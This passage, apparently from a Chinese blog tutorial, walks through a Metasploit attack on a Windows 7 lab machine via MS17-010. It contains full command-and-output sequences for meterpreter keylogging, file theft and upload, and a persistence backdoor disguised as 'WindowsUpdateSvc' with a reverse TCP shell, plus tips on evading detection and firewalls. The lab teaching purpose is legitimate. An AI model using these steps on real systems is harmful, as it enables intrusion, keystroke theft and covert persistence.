+</span></span><span class=line><span class=cl> <span class=m>1960</span>  <span class=m>484</span>   taskhost.e  x64   <span class=m>1</span>        Ankh-PC<span class=se>\A</span>nkh      C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             xe                                           32<span class=se>\t</span>askhost.exe
+</span></span><span class=line><span class=cl> <span class=m>2028</span>  <span class=m>836</span>   dwm.exe     x64   <span class=m>1</span>        Ankh-PC<span class=se>\A</span>nkh      C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>                                                          32<span class=se>\D</span>wm.exe
+</span></span><span class=line><span class=cl> <span class=m>2308</span>  <span class=m>1136</span>  cmd.exe     x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>                                        TEM               32<span class=se>\c</span>md.exe
+</span></span><span class=line><span class=cl> <span class=m>2316</span>  <span class=m>344</span>   conhost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             e                          TEM               32<span class=se>\c</span>onhost.exe
+</span></span><span class=line><span class=cl> <span class=m>2468</span>  <span class=m>1136</span>  cmd.exe     x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>                                        TEM               32<span class=se>\c</span>md.exe
+</span></span><span class=line><span class=cl> <span class=m>2476</span>  <span class=m>344</span>   conhost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             e                          TEM               32<span class=se>\c</span>onhost.exe
+</span></span><span class=line><span class=cl> <span class=m>2716</span>  <span class=m>1136</span>  cmd.exe     x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>                                        TEM               32<span class=se>\c</span>md.exe
+</span></span><span class=line><span class=cl> <span class=m>2724</span>  <span class=m>344</span>   conhost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             e                          TEM               32<span class=se>\c</span>onhost.exe
+</span></span><span class=line><span class=cl> <span class=m>2920</span>  <span class=m>1136</span>  cmd.exe     x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>                                        TEM               32<span class=se>\c</span>md.exe
+</span></span><span class=line><span class=cl> <span class=m>2928</span>  <span class=m>344</span>   conhost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             e                          TEM               32<span class=se>\c</span>onhost.exe
+</span></span><span class=line><span class=cl> <span class=m>3044</span>  <span class=m>1368</span>  notepad.ex  x64   <span class=m>1</span>        Ankh-PC<span class=se>\A</span>nkh      C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             e                                            32<span class=se>\N</span>OTEPAD.EXE
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>meterpreter &gt; migrate <span class=m>1368</span> <span class=c1># 迁移到用户进程从而提取到用户权限</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Migrating from <span class=m>1052</span> to 1368...
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Migration completed successfully.
+</span></span><span class=line><span class=cl>meterpreter &gt; getuid <span class=c1># 当前权限为Ankh</span>
+</span></span><span class=line><span class=cl>Server username: Ankh-PC<span class=se>\A</span>nkh
+</span></span><span class=line><span class=cl>meterpreter &gt; keyscan_start <span class=c1># 开始键盘嗅探</span>
+</span></span><span class=line><span class=cl>Starting the keystroke sniffer ...
+</span></span><span class=line><span class=cl>meterpreter &gt; keyscan_dump <span class=c1># 打印“Hello？”</span>
+</span></span><span class=line><span class=cl>Dumping captured keystrokes...
+</span></span><span class=line><span class=cl>&lt;Shift&gt;Hello&lt;Shift&gt;?
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>meterpreter &gt; keyscan_stop <span class=c1># 结束键盘嗅探</span>
+</span></span><span class=line><span class=cl>Stopping the keystroke sniffer...
+</span></span><span class=line><span class=cl>meterpreter &gt; 
+</span></span></code></pre></td></tr></table></div></div><p>PS：切换到用户身份之后一般很难提升到SYSTEM权限（Windows安全机制），如果尝试<code>getsystem</code>无果，则<code>background</code> -> <code>run</code>重新执行exploit</p><h5 id=3-文件窃取与上传>3. 文件窃取与上传</h5><p>下载上一步中靶机桌面保存的<code>hello.txt</code>文件并上传一个<code>hi.txt</code>文件（可以是可执行的恶意程序）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; cat C:<span class=se>\\</span>Users<span class=se>\\</span>Ankh<span class=se>\\</span>Desktop<span class=se>\\</span>hello.txt <span class=c1># 文件读取</span>
+</span></span><span class=line><span class=cl>Hello?meterpreter &gt; download C:<span class=se>\\</span>Users<span class=se>\\</span>Ankh<span class=se>\\</span>Desktop<span class=se>\\</span>hello.txt /home/kali/Desktop <span class=c1># 把文件下载到Kali桌面</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Downloading: C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop<span class=se>\h</span>ello.txt -&gt; /home/kali/Desktop/hello.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Downloaded 6.00 B of 6.00 B <span class=o>(</span>100.0%<span class=o>)</span>: C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop<span class=se>\h</span>ello.txt -&gt; /home/kali/Desktop/hello.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Completed  : C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop<span class=se>\h</span>ello.txt -&gt; /home/kali/Desktop/hello.txt
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Desktop<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s2>&#34;Hi\!&#34;</span> &gt; hi.txt <span class=c1># Kali终端创建文件</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; upload /home/kali/Desktop/hi.txt &gt; C:<span class=se>\\</span>Users<span class=se>\\</span>Ankh<span class=se>\\</span>Desktop<span class=se>\\</span> <span class=c1># 上传文件</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading  : /home/kali/Desktop/hi.txt -&gt; C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop<span class=se>\h</span>i.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Completed  : /home/kali/Desktop/hi.txt -&gt; C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop<span class=se>\h</span>i.txt
+</span></span></code></pre></td></tr></table></div></div><h4 id=三metasploit持久化后门攻击>三、Metasploit持久化后门攻击</h4><h5 id=利用windows服务机制实现权限维持>利用Windows服务机制实现权限维持</h5><ol><li>Kali通过MS17-010漏洞获得靶机SYSTEM权限会话后，使用<code>persistence_service</code>模块创建持久化后门</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 终端1：攻击配置：</span>
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; use exploit/windows/local/persistence_service <span class=c1># 持久化服务模块</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/local/persistence_service<span class=o>)</span> &gt; <span class=nb>set</span> payload windows/meterpreter/reverse_tcp <span class=c1># 将攻击载荷设置为32位（默认），64位会出现不兼容情况</span>
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/local/persistence_service<span class=o>)</span> &gt; <span class=nb>set</span> SESSION <span class=m>1</span> <span class=c1># 设置为当前获取到SYSTEM权限的会话ID。可以通过sessions指令查看</span>
+</span></span><span class=line><span class=cl><span class=nv>SESSION</span> <span class=o>=</span>&gt; <span class=m>1</span>
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/local/persistence_service<span class=o>)</span> &gt; <span class=nb>set</span> LHOST 10.0.0.223 <span class=c1># 设置为Kali IP</span>
+</span></span><span class=line><span class=cl><span class=nv>LHOST</span> <span class=o>=</span>&gt; 10.0.0.223
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/local/persistence_service<span class=o>)</span> &gt; <span class=nb>set</span> LPORT <span class=m>4446</span> <span class=c1># 指定一个监听端口</span>
+</span></span><span class=line><span class=cl><span class=nv>LPORT</span> <span class=o>=</span>&gt; <span class=m>4446</span>
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/local/persistence_service<span class=o>)</span> &gt; <span class=nb>set</span> SERVICE_NAME WindowsUpdateSvc
+</span></span><span class=line><span class=cl><span class=nv>SERVICE_NAME</span> <span class=o>=</span>&gt; WindowsUpdateSvc <span class=c1># 将服务名伪装</span>
+</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span>&gt; windows/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/local/persistence_service<span class=o>)</span> &gt; run <span class=c1>#执行</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.0.0.223:4446 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Running module against ANKH-PC
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Meterpreter service exe written to C:<span class=se>\W</span>indows<span class=se>\T</span>EMP<span class=se>\k</span>eQgBw.exe
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating service WindowsUpdateSvc
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ANKH-PC_20251231.0748/ANKH-PC_20251231.0748.rc
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>177734</span> bytes<span class=o>)</span> to 10.0.0.17
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>2</span> opened <span class=o>(</span>10.0.0.223:4446 -&gt; 10.0.0.17:49159<span class=o>)</span> at 2025-12-31 09:07:49 +0000 
+</span></span></code></pre></td></tr></table></div></div><p>PS：由于该模块创建了一个持久化服务并且立刻启动了该服务，因此该服务会主动向攻击机发起连接。因此启动该模块后立刻创建了一个新的会话（session 2）。两个会话的权限相同</p><ol start=2><li>创建监听器</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 终端2：监听配置</span>
+</span></span><span class=line><span class=cl>msf6 &gt; use exploit/multi/handler
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using configured payload generic/shell_reverse_tcp
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> payload windows/meterpreter/reverse_tcp <span class=c1># 与攻击配置一致</span>
+</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span>&gt; windows/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LHOST 10.0.0.223 <span class=c1># 绑定攻击机IP</span>
+</span></span><span class=line><span class=cl><span class=nv>LHOST</span> <span class=o>=</span>&gt; 10.0.0.223
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LPORT <span class=m>4446</span> <span class=c1># 绑定监听端口</span>
+</span></span><span class=line><span class=cl><span class=nv>LPORT</span> <span class=o>=</span>&gt; <span class=m>4446</span>
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> ExitOnSession <span class=nb>false</span>  <span class=c1># 即使断开也保持监听</span>
+</span></span><span class=line><span class=cl><span class=nv>ExitOnSession</span> <span class=o>=</span>&gt; <span class=nb>false</span>
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; run -j <span class=c1># -j为后台运行</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Exploit running as background job 0.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Exploit completed, but no session was created.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.0.0.223:4446 
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; 
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>重启靶机</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 终端1：（重启靶机，无需登录）原会话断开</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17 - Meterpreter session <span class=m>1</span> closed.  Reason: Died
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17 - Meterpreter session <span class=m>2</span> closed.  Reason: Died
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>靶机自动连接监听器</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 终端2：监听到新的会话连接（SYSTEM权限）</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>177734</span> bytes<span class=o>)</span> to 10.0.0.17
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>1</span> opened <span class=o>(</span>10.0.0.223:4446 -&gt; 10.0.0.17:49205<span class=o>)</span> at 2025-12-31 09:09:46 +0000
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; sessions
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Active <span class=nv>sessions</span>
+</span></span><span class=line><span class=cl><span class=o>===============</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  Id  Name  Type                 Information           Connection
+</span></span><span class=line><span class=cl>  --  ----  ----                 -----------           ----------
+</span></span><span class=line><span class=cl>  <span class=m>1</span>         meterpreter x86/win  NT AUTHORITY<span class=se>\S</span>YSTEM   10.0.0.223:4446 -&gt; <span class=m>1</span>
+</span></span><span class=line><span class=cl>            dows                 @ ANKH-PC             0.0.0.17:49205 <span class=o>(</span>10.0
+</span></span><span class=line><span class=cl>                                                       .0.17<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; sessions -i <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting interaction with 1...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>meterpreter &gt; getuid
+</span></span><span class=line><span class=cl>Server username: NT AUTHORITY<span class=se>\S</span>YSTEM
+</span></span><span class=line><span class=cl>meterpreter &gt; 
+</span></span></code></pre></td></tr></table></div></div><h5 id=相关原理>相关原理</h5><ul><li><strong>持久化机制</strong>：<ul><li><strong>生成meterpreter后门程序</strong> → C:\Windows\TEMP\keQgBw.exe</li><li><strong>创建Windows服务</strong> → &ldquo;WindowsUpdateSvc&rdquo;</li><li><strong>配置服务自动启动（开机自启）</strong></li><li><strong>服务指向后门程序路径</strong></li></ul></li><li><strong>服务伪装技巧</strong>：<ul><li><strong>服务名伪装</strong>：使用<code>WindowsUpdateSvc</code>这样的合法名称，避免被轻易发现</li><li><strong>文件路径</strong>：存放在<code>C:\Windows\TEMP\</code>，利用系统目录降低怀疑</li><li><strong>权限继承</strong>：服务以SYSTEM权限运行，维持高权限访问</li></ul></li><li><strong>网络通信机制</strong><ul><li><strong>反向连接</strong>：靶机主动连接攻击机（10.0.0.223:4446）</li><li><strong>优势</strong>：可绕过出站防火墙限制（大多数防火墙允许出站连接）</li><li><strong>稳定性</strong>：即使连接断开也会尝试重连</li></ul></li></ul><h4 id=四shell>四、Shell</h4><p>在<code>meterpreter</code>下执行shell可以SYSTEM身份进入靶机终端。由于编码问题（Windows终端采用GBK编码，而Kali终端采用UTF-8编码）shell后可能出现乱码，可以通过指令修改靶机编码方式（<code>chcp 65001</code>，Windows命令提示符(cmd)中设置代码页(Code Page)的命令）以解决该问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; shell
+</span></span><span class=line><span class=cl>Process <span class=m>1028</span> created.
+</span></span><span class=line><span class=cl>Channel <span class=m>2</span> created.
+</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>�汾 6.1.7600<span class=o>]</span>
+</span></span><span class=line><span class=cl>��Ȩ���� <span class=o>(</span>c<span class=o>)</span> <span class=m>2009</span> Microsoft Corporation����������Ȩ����
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;chcp <span class=m>65001</span>
+</span></span><span class=line><span class=cl>chcp <span class=m>65001</span>
+</span></span><span class=line><span class=cl>Active code page: <span class=m>65001</span> <span class=c1># 936对应GBK，65001对应UTF-8</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;whoami
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;cd C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl><span class=nb>cd</span> C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop                                                                                                                                                         
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop&gt;tree /f                                                            
+</span></span><span class=line><span class=cl>tree /f                                                                                   Folder PATH listing
+</span></span><span class=line><span class=cl>Volume serial number is 000001BD 0014:5107                                                               
+</span></span><span class=line><span class=cl>C:.           
+</span></span><span class=line><span class=cl>    Hello.txt
+</span></span><span class=line><span class=cl>    hi.txt
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>No subfolders exist 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop&gt;type Hello.txt
+</span></span><span class=line><span class=cl><span class=nb>type</span> Hello.txt
+</span></span><span class=line><span class=cl>Hello?
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>nkh<span class=se>\D</span>esktop&gt;exit
+</span></span><span class=line><span class=cl><span class=nb>exit</span>
+</span></span><span class=line><span class=cl>meterpreter &gt; 
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/ms17-010/>MS17-010</a>
+<a href=/tags/%E6%BC%8F%E6%B4%9E/>漏洞</a>
+<a href=/tags/kali/>Kali</a>
+<a href=/tags/win7/>Win7</a></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js integrity=sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{const e=[".main-article",".widget--toc"];e.forEach(e=>{const t=document.querySelector(e);t&&renderMathInElement(t,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})})</script></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/kali-toolkitnmapnetwork-mapper/><div class=article-details><h2 class=article-title>【Kali Toolkit】Nmap（Network Mapper）</h2></div></a></article><article><a href=/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/><div class=article-details><h2 class=article-title>渗透测试基础</h2></div></a></article></div></div></aside><script src=https://utteranc.es/client.js repo=leuco-yuu/blog-comments issue-term=pathname crossorigin=anonymous async></script><style>.utterances{max-width:unset}</style><script>let utterancesLoaded=!1;function setUtterancesTheme(e){let t=document.querySelector(".utterances iframe");t&&t.contentWindow.postMessage({type:"set-theme",theme:`github-${e}`},"https://utteranc.es")}addEventListener("message",e=>{if(e.origin!=="https://utteranc.es")return;utterancesLoaded=!0,setUtterancesTheme(document.documentElement.dataset.scheme)}),window.addEventListener("onColorSchemeChange",e=>{if(!utterancesLoaded)return;setUtterancesTheme(e.detail)})</script><footer class=site-footer><section class=copyright>&copy;
+2025 Leuco(leucoyuu@163.com)</section><section class=powerby>Embrace Bit Art<br>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.29c987cab5419174d4dc85c2a56544a08027cc7f77efb5749447a3e80f85a03d.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
